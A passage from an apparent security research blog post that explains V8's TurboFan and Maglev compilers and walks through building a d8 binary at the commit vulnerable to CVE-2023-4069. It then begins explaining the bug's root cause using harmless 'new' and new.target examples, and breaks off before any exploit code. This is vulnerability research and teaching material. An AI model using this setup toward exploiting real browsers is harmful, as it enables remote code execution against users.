</span></span><span class="line"><span class="cl">    <span class="nx">hot_square</span><span class="p">({</span><span class="nx">x</span><span class="o">:</span> <span class="nx">i</span><span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>Making the square function &lsquo;hot&rsquo;</p>
</blockquote>
<p>V8 utilizes &ldquo;maps&rdquo; or <a href="https://v8.dev/docs/hidden-classes">hidden classes</a> to manage and optimize object properties. A map
is an internal representation that defines the layout (i.e., the
structure and property types) of an object. When <em>hot_square</em> is
called with an object <code>{x: i}</code>, V8 uses maps to keep track of the
structure of these objects. If all objects passed to the function have
the same structure (e.g., an object with only the property <em>x</em>), V8
uses this assumption to optimize the function.</p>
<p>By marking all objects processed by <em>hot_square</em> with the same map,
TurboFan can speed up how <em>obj.x</em> is accessed and computed,
particularly by eliminating repetitive checks on the object&rsquo;s
structure. This optimized path allows the multiplication (<code>obj.x * obj.x</code>) to be executed more efficiently.</p>
<p>To test this in practice, we can now invoke d8 with the
<code>--print-opt-code</code> flag to get the code optimized by TurboFan and then
load the previous <em>hot_square</em> JS code.</p>
<pre tabindex="0"><code>C:\v8_dev\v8\v8\out&gt;x64.debug\d8.exe --allow-natives-syntax --print-opt-code
V8 version 11.5.150.16
d8&gt; load (&#39;square.js&#39;)
...
--- End code ---
--- Raw source ---
function hot_square(obj) {
    return obj.x * obj.x;
}
for (let i=0; i &lt; 999999; i++) {
        hot_square({x:i});
}
--- Optimized code ---
optimization_id = 1
source_position = 0
kind = TURBOFAN
stack_slots = 14
compiler = turbofan
address = 000003870011AE81
Instructions (size = 576)
[Prologue]
00007FFDB81441C0     0  488d1df9ffffff       REX.W leaq rbx,[rip+0xfffffff9]
00007FFDB81441C7     7  483bd9               REX.W cmpq rbx,rcx
00007FFDB81441CA     a  740d                 jz 00007FFDB81441D9  &lt;+0x19&gt;
00007FFDB81441CC     c  ba82000000           movl rdx,0000000000000082
00007FFDB81441D1    11  41ff9500500000       call [r13+0x5000]
00007FFDB81441D8    18  cc                   int3l
00007FFDB81441D9    19  8b59f4               movl rbx,[rcx-0xc]
00007FFDB81441DC    1c  4903de               REX.W addq rbx,r14
00007FFDB81441DF    1f  f7431700000020       testl [rbx+0x17],0x20000000
00007FFDB81441E6    26  0f8594e16f27         jnz 00007FFDDF842380  (CompileLazyDeoptimizedCode)    ;; near builtin entry
00007FFDB81441EC    2c  55                   push rbp
00007FFDB81441ED    2d  4889e5               REX.W movq rbp,rsp
00007FFDB81441F0    30  56                   push rsi
00007FFDB81441F1    31  57                   push rdi
00007FFDB81441F2    32  50                   push rax
00007FFDB81441F3    33  ba58000000           movl rdx,0000000000000058
00007FFDB81441F8    38  41ff9500500000       call [r13+0x5000]
00007FFDB81441FF    3f  cc                   int3l
00007FFDB8144200    40  4883ec18             REX.W subq rsp,0x18
00007FFDB8144204    44  488975b0             REX.W movq [rbp-0x50],rsi
00007FFDB8144208    48  493b65a0             REX.W cmpq rsp,[r13-0x60] (external value (StackGuard::address_of_jslimit()))
00007FFDB814420C    4c  0f86d2000000         jna 00007FFDB81442E4  &lt;+0x124&gt;
[Check value is a SMI and checks map]
00007FFDB8144212    52  488b4dc8             REX.W movq rcx,[rbp-0x38]
00007FFDB8144216    56  f6c101               testb rcx,0x1
00007FFDB8144219    59  0f85b4010000         jnz 00007FFDB81443D3  &lt;+0x213&gt;
00007FFDB814421F    5f  81f97e841e00         cmpl rcx,0x1e847e
00007FFDB8144225    65  0f8c1e000000         jl 00007FFDB8144249  &lt;+0x89&gt;
...
[Divide by two to get SMI]
00007FFDB8144249    89  488bf9               REX.W movq rdi,rcx
00007FFDB814424C    8c  d1ff                 sarl rdi, 1
[Perform Square Operation]
00007FFDB814424E    8e  4c8bc7               REX.W movq r8,rdi
00007FFDB8144251    91  440fafc7             imull r8,rdi
...
[Multiply by two to get doubled SMI]
00007FFDB8144292    d2  488bcf               REX.W movq rcx,rdi
00007FFDB8144295    d5  03cf                 addl rcx,rdi
</code></pre><blockquote>
<p>Inspecting the Turbofan otimized code</p>
</blockquote>
<p>To gain a better understanding, I have included square brackets comments
at the start of each JIT compiled code section.</p>
<p>The first part, starting at address <em>00007FFDB81441C0</em> is the
prologue, which basically checks if the code is still sane and it will
bail out if no.</p>
<p>Then, on the second chunk (00007FFDB8144212), we load the first (and
ony) parameter into RCX and test if its least significant bit (lsb) is
set to 1 via the <em>testb</em> instruction.</p>
<p>Due to performance reasons, pointers in V8 are
<a href="https://v8.dev/blog/pointer-compression">tagged</a>, meaning the last
bit is set to 1 for any V8 pointer. On the other hand, SMIs have 0 as the
last bit. This means that to avoid SMIs having the least significant
bit set to 1, their values need to be doubled in memory unless they
are performing an operation.</p>
<p>And this is exactly what&rsquo;s happening here: at memory address
<em>00007FFDB814424C</em>, the <em>sarl</em> (Shift Arithmetic Right) operation is
shifting the value of the SMI one bit to the right, effectively
dividing it by two to return it to its original value.</p>
<p>Then the square calculation is performed with the <em>imull</em> operation on
the real SMI value stored in <em>RDI</em> against the same value previously
stored in <em>R8</em>.</p>
<p>Finally, the double-SMI value is restored into <em>RCX</em> by adding the
halved value to itself.</p>
<p>We could cover many more aspects and details about how the TurboFan
optimization and de-optimization process works, but that would likely
take one or two additional blog posts.</p>
<p>This concludes our brief overview of the V8&rsquo;s pipeline, which can be
nicely summarized with this graph by <a href="https://twitter.com/addyosmani">Addy
Osmani</a>.</p>
<p><img src="../../../../img/v8/pipeline1.png">
<em>Summary of the V8 Pipeline</em></p>
<p>The &ldquo;Sea of Nodes&rdquo; approach improves TurboFan&rsquo;s ability to
optimize JavaScript execution, especially when working with Ignition,
V8&rsquo;s interpreter. This combination aims for peak performance by first
interpreting code quickly and then optimizing the parts that are used
the most.</p>
<p>However, despite the advanced technologies behind Ignition+Turbofan,
the optimization process is not without its challenges. This has led
to the development of the Maglev compiler, which we will explore next.</p>
<h3 id="the-maglev-compiler">The Maglev Compiler</h3>
<p>In 2021, the V8 team introduced
<a href="https://v8.dev/blog/sparkplug"><em>Sparkplug</em></a>, a baseline Just-In-Time
(JIT) compiler designed to improve performance over Ignition without
the overhead of extensive optimizations that Turbofan requires.</p>
<p>Despite their capabilities, each of these compilers has limitations.
Ignition executes bytecode but lacks the performance needed for
high-demand scenarios.
TurboFan, while capable of significantly
optimizing performance, is slower to compile, making it unsuitable for
functions that don’t run long enough to benefit from its
optimizations. Moreover, the newly introduced Sparkplug offers a speed
improvement over Ignition but has a low upper limit on performance
enhancements due to its simplicity and single-pass compilation
approach.</p>
<p>In December 2023 <a href="https://v8.dev/blog/maglev">Maglev</a> has been
introduced to address the performance gap between Sparkplug and
TurboFan. Maglev generates faster code than Sparkplug and compiles
significantly faster than TurboFan. It does so by targeting code that doesn&rsquo;t
<em>get hot</em> enough for TurboFan&rsquo;s optimizations but can still benefit from
some level of optimization.</p>
<p>Maglev&rsquo;s design incorporates several key elements. Unlike Sparkplug&rsquo;s
single-pass approach, Maglev uses a traditional <a href="https://source.chromium.org/chromium/chromium/src/+/376123191e0361a8639c1783abcf2490a506c748:v8/src/maglev/maglev-ir.h">static
single-assignment</a>
(SSA) intermediate representation.</p>
<p>Following the adoption of SSA, Maglev&rsquo;s compilation process involves
two distinct phases. In the first phase, Maglev builds a
<a href="https://source.chromium.org/chromium/chromium/src/+/376123191e0361a8639c1783abcf2490a506c748:v8/src/maglev/maglev-compiler.cc;l=403">graph</a>
from the previously generated SSA nodes. Subsequently, in the second
phase, it optimize the
<a href="https://source.chromium.org/chromium/chromium/src/+/376123191e0361a8639c1783abcf2490a506c748:v8/src/maglev/maglev-compiler.cc;l=421">Phi</a>
values to further improve the compilation.</p>
<p><a href="https://mapping-high-level-constructs-to-llvm-ir.readthedocs.io/en/latest/control-structures/ssa-phi.html">Phi
values</a>
(or phi nodes) are used in the intermediate representation (IR) of
the code to manage variables that can have different values depending
on the control flow path taken during execution. These nodes are
essential for correctly handling control flow and variable assignments
in scenarios where the program&rsquo;s execution can follow multiple paths.</p>
<p>When there is a branching in the control flow, such as an <em>if-else</em>
statement, phi nodes decide which value to use based on which
branch was taken.</p>
<p>For example, consider a simple scenario where a
variable <em>x</em> gets different values in an if-else block:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">condition</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">x</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Use x here
</span></span></span></code></pre></div><blockquote>
<p>Phi node example code</p>
</blockquote>
<p>In the IR, a phi node would represent the value of <em>x</em> after the
if-else block, ensuring that the correct value (either 1 or 2) is used
based on the path taken.</p>
<p>During the prepass phase, Maglev identifies where phi nodes are needed
by analyzing the control flow and variable assignments. This prepass
allows Maglev to create phi nodes in a way that enables the SSA graph
to be generated in a single forward pass without needing to &ldquo;fix up&rdquo;
variables later.</p>
<p>Maglev is enabled by default starting in Chrome version 114 and the
updated V8 pipeline as of 2023 is summarized in the following diagram.</p>
<p><img src="../../../../img/v8/pipeline3.png">
<em>V8 2023 Pipeline - Source: Google Design Documentation</em></p>
<p>With a better understanding of Maglev&rsquo;s role in the V8 pipeline, let&rsquo;s
dive into the heart of this blog post: analyzing the bug that is
affecting Maglev. But first, let&rsquo;s set the stage by preparing our V8
debugging environment.</p>
<h2 id="setting-up-the-v8-debugging-environment">Setting up the V8 Debugging Environment</h2>
<p>To dig further into the bug details and perform a root cause analysis,
we first need a working debugging environment. Let&rsquo;s explore how to
set up a tailored V8 environment with the vulnerable version.</p>
<p>The environment can be set up either on a physical box or on a
<a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/">development
VM</a>.
I personally prefer using a physical machine as it gives better
performance when compiling the extensive V8 source code. Once we have
selected our target environment, we&rsquo;ll need to install the latest
<a href="https://visualstudio.microsoft.com/vs/community/">Visual Studio 2022
Community</a> edition.
The Community edition is free and satisfies all the requirements
needed to debug V8.</p>
<p>From the Visual Studio Installer, select these two <em>Workloads</em>:</p>
<ul>
<li>Desktop Development with C++</li>
<li>Python Development</li>
</ul>
<p>From the <em>Individual Components</em> window pane, select the following
items:</p>
<ul>
<li>C++ ATL for Latest v143 Build Tools (x86 & x64)</li>
<li>C++ MFC for Latest v143 Build Tools (x86 & x64)</li>
<li>C++ Clang Compiler for Windows (17.0.3)</li>
<li>MSBuild support for LLVM (clang-cl) toolset</li>
<li>C++ CMake tools for Windows</li>
<li>Git for Windows</li>
<li>Windows 11 SDK (10.0.22621.0)</li>
</ul>
<p>Next, we need to install the <a href="https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/">Windows 11 SDK Debugging Tools</a>.</p>
<p>Once downloaded, run the installer file <em>winsdksetup.exe</em> and install
it, making sure that &ldquo;Debugging Tools for Windows&rdquo; is included. After
installation, you can find the debugging tools in the installation
directory at <code>C:\Program Files (x86)\Windows Kits\10\Debuggers</code>.</p>
<p>Now that all the Windows development prerequisites are installed, we
are ready to install the V8 development tools.</p>
<p>We can create a folder such as <code>C:\v8_dev</code> under the root drive where
we can install all the necessary V8 dependencies and source code.</p>
<p>From an elevated command prompt, navigate to that folder and git clone
Depot Tools.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\v8_dev</span><span class="c1">&gt; git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span>
</span></span><span class="line"><span class="cl">Cloning into &#39;depot_tools&#39;...
</span></span><span class="line"><span class="cl">remote: Sending approximately 49.80 MiB ...
</span></span><span class="line"><span class="cl">remote: Counting objects: 9, done
</span></span><span class="line"><span class="cl">remote: Finding sources: 100% (9/9)
</span></span><span class="line"><span class="cl">remote: Total 59597 (delta 42743), reused 59594 (delta 42743)
</span></span><span class="line"><span class="cl">Receiving objects: 100% (59597/59597), 49.78 MiB <span class="p">|</span> 11.15 MiB/s, done.
</span></span><span class="line"><span class="cl">Resolving deltas: 100% (42743/42743), done.
</span></span></code></pre></div><blockquote>
<p>Downloading Depot Tools</p>
</blockquote>
<p>Depot Tools is a collection of scripts and tools designed to manage
the development workflow for Chromium-related projects. These
tools help in fetching source code, managing dependencies, building
projects, and running tests. Some of the tools are <em>gclient</em> for
syncing dependencies, <em>ninja</em> for building, and <em>gn</em> for project
generation.</p>
<p>We can then add the depot tools folder at the beginning of
the <em>PATH</em> system variable as well as the two user variables
<em>DEPOT_TOOLS_WIN_TOOLCHAIN</em> and <em>vs2022_install</em>. We set them to
<em>0</em> and the VS2022 installation location <code>C:\Program Files\Microsoft Visual Studio\2022\Community</code>.</p>
<p>We can do so by pasting the following commands in the same elevated
command shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">setx PATH <span class="s2">&#34;C:\v8_dev\depot_tools\;</span><span class="nv">%PATH%</span><span class="s2">&#34;</span> /M
</span></span><span class="line"><span class="cl">setx vs2022_install <span class="s2">&#34;C:\Program Files\Microsoft Visual Studio\2022\Community&#34;</span>
</span></span><span class="line"><span class="cl">setx DEPOT_TOOLS_WIN_TOOLCHAIN <span class="s2">&#34;0&#34;</span>
</span></span></code></pre></div><blockquote>
<p>Adding the Necessary Environment Variables</p>
</blockquote>
<p>Once the variables are set, we can move to the depot tools subfolder
and run the <em>gclient</em> command, which might take a while to complete.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\v8_dev\depot_tools</span><span class="c1">&gt; gclient</span>
</span></span><span class="line"><span class="cl">Updating depot_tools...
</span></span><span class="line"><span class="cl">Downloading CIPD client for windows-amd64 from https://chrome-infra-packages.appspot.com/client?platform=windows-amd64<span class="p">&</span>version=git_revision:200dbdf0e967e81388359d3f85f095d39b35db67...
</span></span><span class="line"><span class="cl">WARNING: Your metrics.cfg file was invalid or nonexistent. A new one will be created.
</span></span><span class="line"><span class="cl">Usage: gclient.py <span class="p">&lt;</span>command<span class="p">&gt;</span> [options]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Meta checkout dependency manager for Git.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Commands are:
</span></span><span class="line"><span class="cl">  config       creates a .gclient file in the current directory
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Options:
</span></span><span class="line"><span class="cl">  --version             show program&#39;s version number and exit
</span></span><span class="line"><span class="cl">  -h, --help            show this help message and exit
</span></span><span class="line"><span class="cl">  -j JOBS, --jobs=JOBS  Specify how many SCM commands can run in parallel;
</span></span><span class="line"><span class="cl">                        defaults to 20 on this machine
</span></span><span class="line"><span class="cl">  -v, --verbose         Produces additional output for diagnostics. Can be
</span></span><span class="line"><span class="cl">                        used up to three times for more logging info.
</span></span><span class="line"><span class="cl">  --gclientfile=CONFIG_FILENAME
</span></span><span class="line"><span class="cl">                        Specify an alternate .gclient file
</span></span><span class="line"><span class="cl">  --spec=SPEC           create a gclient file containing the provided string.
</span></span><span class="line"><span class="cl">                        Due to Cygwin/Python brokenness, it can&#39;t contain any
</span></span><span class="line"><span class="cl">                        newlines.
</span></span><span class="line"><span class="cl">  --no-nag-max          Ignored for backwards compatibility.
</span></span></code></pre></div><blockquote>
<p>Running the gclient Command</p>
</blockquote>
<p>The <em>gclient</em> command is part of Depot Tools and is used to manage and
synchronize dependencies for Chromium and related projects. It fetches
the source code, checks out the correct versions of dependencies, and
sets up the development environment.</p>
<p>If no errors are encountered, we can confirm that the Python 3 depot
tools installation is preferred over the default system one.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\v8_dev\depot_tools</span><span class="c1">&gt; where python3</span>
</span></span><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\v8_dev\depot_tools\python3.bat</span>
</span></span><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\Users\uf0\AppData\Local\Microsoft\WindowsApps\python3.exe</span>
</span></span></code></pre></div><blockquote>
<p>Verifying Python3 Path Order of Preference</p>
</blockquote>
<p>From the <em>v8_dev</em> folder, we can now create a <em>v8</em> subfolder and
retrieve the V8 source code with the <em>fetch</em> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\v8_dev</span><span class="c1">&gt;mkdir v8 && cd v8</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\v8_dev\v8</span><span class="c1">&gt; fetch v8</span>
</span></span><span class="line"><span class="cl">Updating depot_tools...
</span></span><span class="line"><span class="cl">Running: &#39;C:\Users\uf0\AppData\Local\.vpython-root\store\python_venv-ffl9mmbr4c2o2io44cqtfhe7os\contents\Scripts\python3.exe&#39; &#39;C:\v8_dev\depot_tools\gclient.py&#39; root
</span></span><span class="line"><span class="cl">Running: &#39;C:\Users\uf0\AppData\Local\.vpython-root\store\python_venv-ffl9mmbr4c2o2io44cqtfhe7os\contents\Scripts\python3.exe&#39; &#39;C:\v8_dev\depot_tools\gclient.py&#39; config --spec &#39;solutions = [
</span></span><span class="line"><span class="cl">  {
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;name&#34;</span>: <span class="s2">&#34;v8&#34;</span>,
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;url&#34;</span>: <span class="s2">&#34;https://chromium.googlesource.com/v8/v8.git&#34;</span>,
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;deps_file&#34;</span>: <span class="s2">&#34;DEPS&#34;</span>,
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;managed&#34;</span>: False,
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;custom_deps&#34;</span>: {},
</span></span><span class="line"><span class="cl">  },
</span></span><span class="line"><span class="cl">]
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">Running hooks: 100% (26/26), done.
</span></span><span class="line"><span class="cl">Running: git config --add remote.origin.fetch &#39;+refs/tags/*:refs/tags/*&#39;
</span></span><span class="line"><span class="cl">Running: git config diff.ignoreSubmodules dirty
</span></span></code></pre></div><blockquote>
<p>Fetching V8 code</p>
</blockquote>
<p>Having pulled V8&rsquo;s source code, we are now ready to git check out the
vulnerable version where CVE-2023-4069 is present and still unpatched.</p>
<p>According to the filed <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1337550">Chromium
bug</a>,
the issue has been tested in the <em>11.5.150.16</em> version and tested on
the <em>5315f073233429c5f5c2c794594499debda307bd</em> commit. So we can git checkout to it as follows from the newly created <em>v8</em> folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\v8_dev\v8</span><span class="c1">&gt; cd v8</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\v8_dev2\v8\v8</span><span class="c1">&gt; git checkout 5315f073233429c5f5c2c794594499debda307bd</span>
</span></span><span class="line"><span class="cl">Updating files: 100% (4074/4074), done.
</span></span><span class="line"><span class="cl">Previous HEAD position was 26d63123203 Revert <span class="s2">&#34;[heap][handles] Revise parking invariants for direct handles&#34;</span>
</span></span><span class="line"><span class="cl">HEAD is now at 4c11841391c [heap] Incremental marking tracing improvements
</span></span></code></pre></div><blockquote>
<p>Checking out V8 to the vulnerable version</p>
</blockquote>
<p>Next, we need to run the <code>gclient sync -D</code> command in order to verify
that the source code is in a clean state, removing any files that are
not tracked by the repository and ensuring that all dependencies match
the specified commit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\v8_dev\v8\v8</span><span class="c1">&gt; gclient sync -D</span>
</span></span><span class="line"><span class="cl">Updating depot_tools...
</span></span><span class="line"><span class="cl">Syncing projects: 100% (29/29), done.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">WARNING: &#39;v8\tools\protoc_wrapper&#39; is no longer part of this client.
</span></span><span class="line"><span class="cl">It is recommended that you manually remove it or use &#39;gclient sync -D&#39; next time.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">Downloading https://commondatastorage.googleapis.com/chromium-browser-clang/Win/clang-llvmorg-17-init-10134-g3da83fba-1.tar.xz .......... Done.
</span></span><span class="line"><span class="cl">Running hooks: 100% (32/32), done.
</span></span></code></pre></div><blockquote>
<p>Updating dependencies with gclient</p>
</blockquote>
<p>We fetched all necessary dependencies listed in the
<a href="https://chromium.googlesource.com/chromium/src/+/master/buildtools/checkdeps/README.md">DEPS</a>
file, checked out the appropriate versions of these repositories, and
applied any required configurations.</p>
<p>Having the right vulnerable source code and dependencies
up-to-date, it&rsquo;s now time to compile V8. We&rsquo;ll do so via the
<a href="https://chromium.googlesource.com/v8/v8/+/cf66f73771356096c7d9dc6d8523421d6df1f2f8/tools/dev/gm.py">gm.py</a>
Python wrapper tool and specify the kind of architecture/build as an
argument.</p>
<p>Since the Maglev compiler is available only in the release version, we
have to specify the <strong>x64.release</strong> flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\v8_dev\v8\v8</span><span class="c1">&gt; python3 tools\dev\gm.py x64.release</span>
</span></span><span class="line"><span class="cl"># mkdir -p out\x64.release
</span></span><span class="line"><span class="cl"># echo <span class="p">&gt;</span> out\x64.release\args.gn <span class="p">&lt;</span>&lt; EOF
</span></span><span class="line"><span class="cl">is_component_build = false
</span></span><span class="line"><span class="cl">is_debug = false
</span></span><span class="line"><span class="cl">target_cpu = <span class="s2">&#34;x64&#34;</span>
</span></span><span class="line"><span class="cl">v8_enable_sandbox = true
</span></span><span class="line"><span class="cl">use_goma = false
</span></span><span class="line"><span class="cl">v8_enable_backtrace = true
</span></span><span class="line"><span class="cl">v8_enable_disassembler = true
</span></span><span class="line"><span class="cl">v8_enable_object_print = true
</span></span><span class="line"><span class="cl">v8_enable_verify_heap = true
</span></span><span class="line"><span class="cl">dcheck_always_on = false
</span></span><span class="line"><span class="cl">EOF
</span></span><span class="line"><span class="cl"># gn
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> gen out\x64.release
</span></span><span class="line"><span class="cl">Done. Made 190 targets from 103 files in 2429ms
</span></span><span class="line"><span class="cl"># autoninja -C out\x64.release d8
</span></span><span class="line"><span class="cl">ninja: Entering directory `out\x64.release&#39;
</span></span><span class="line"><span class="cl">[1998/1998] LINK d8.exe d8.exe.pdb
</span></span><span class="line"><span class="cl">Done! - V8 compilation finished successfully.
</span></span></code></pre></div><blockquote>
<p>Compiling V8</p>
</blockquote>
<p>It&rsquo;s now time to test our freshly compiled d8 binary. We can launch it
from inside the <code>out\x64.release</code> folder along with the <code>--maglev</code>
flag. If everything went good and well, we should be able to spawn a
<em>11.5.150.16</em> d8 version as shown below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\v8_dev\v8\v8\out\x64.release\d8.exe</span><span class="c1"> --maglev</span>
</span></span><span class="line"><span class="cl">V8 version 11.5.150.16
</span></span><span class="line"><span class="cl">d8&gt;
</span></span></code></pre></div><p>Great! We managed to compile and build a CVE-2023-4069 vulnerable d8
version. Let&rsquo;s now dive a bit more into the bug&rsquo;s root cause and
exploitation.</p>
<h2 id="cve-2023-4069-walkthrough">CVE-2023-4069 Walkthrough</h2>
<p>In October 2023, <a href="https://x.com/mmolgtm">Man Yue Mo</a> from the GitHub security team published a
<a href="https://github.blog/2023-10-17-getting-rce-in-chrome-with-incomplete-object-initialization-in-the-maglev-compiler/">write-up</a>
about CVE-2023-4069 Type Confusion in V8.</p>
<p>In short, the root cause of the bug in the Maglev compiler relates to
incomplete object initialization during object construction in V8.
When an object is constructed, V8 may create a partially initialized
object before setting all its properties. Maglev&rsquo;s speculative
optimizations can result in objects being used in this incomplete
state, leading to type confusion. During the optimization process,
Maglev might execute intermediate steps that use an object before an
object property is set, causing the code to access an uninitialized
object. This can lead to memory corruption vulnerability as we&rsquo;ll see
shortly.</p>
<p>This was the vulnerability TL;DR but let&rsquo;s try now to explain the
inception of the bug by starting with the
related concepts.</p>
<p>In JavaScript, the
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/new"><em>new</em></a> operator
is utilized as part of its Object Oriented Programming functionality.</p>
<p>It is leveraged to create an instance of <em>built-in</em>
object type. It does so by creating a new object, setting its
prototype, binding <em>this</em> to the new object, and returning the new
object (unless the constructor returns an object).</p>
<p>As an example of the <em>new</em> operator, the following code defines
a constructor function <em>Person</em> that assigns the passed <em>name</em>
parameter to a property called <em>name</em> on the created object.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">Person</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">this</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">person</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Person</span><span class="p">(</span><span class="s1">&#39;uf0&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">person</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span> <span class="c1">// Outputs: uf0
</span></span></span></code></pre></div><blockquote>
<p>JS Example of the &rsquo;new&rsquo; Operator</p>
</blockquote>
<p>When <em>new Person(&lsquo;uf0&rsquo;)</em> is called, it creates a new instance of
<em>Person</em> with <em>name</em> set to <em>&lsquo;uf0&rsquo;</em>. The <em>console.log(person.name);</em>
statement then prints out the value of the <em>name</em> property.</p>
<p>On top of that, we also have a similar - but not quite - operator, the
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/new.target">new.target</a>.
It is  special meta-property available within constructors. It allows
us to detect whether a function or constructor was called using the
<em>new</em> operator. If called via <em>new</em>, <em>new.target</em> references the
constructor function or class. If called without <em>new</em>, <em>new.target</em>
returns <em>undefined</em>.</p>
<p>This can be useful to enforce that constructors are only called with
<em>new</em>, preventing object initialization misuse.</p>
<p>To better clarify these notions, the code below illustrates how <em>new.target</em>
works in combination with the <em>new</em> operator.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">Person</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">new</span><span class="p">.</span><span class="nx">target</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nx">TypeError</span><span class="p">(</span><span class="s1">&#39;Must use the new operator with the &#34;new&#34; constructor&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">this</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">Person</span><span class="p">(</span><span class="s1">&#39;uf0&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">person</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Person</span><span class="p">(</span><span class="s1">&#39;uf0&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">person</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span> 
</span></span></code></pre></div><blockquote>
<p>Using the &lsquo;New.Target&rsquo; Operator While Instantiating Objects With the &lsquo;New&rsquo; Constructor</p>
</blockquote>
<p>Here, <em>Person</em> constructor checks <em>new.target</em> to ensure it was called
with <em>new</em>. If not, it throws an error. The <em>new.target</em> helps in
making JavaScript code more robust by enforcing proper instantiation
of objects.</p>
<p>We can test the behavior by saving the above
code as <em>new.js</em> and load it from d8.</p>
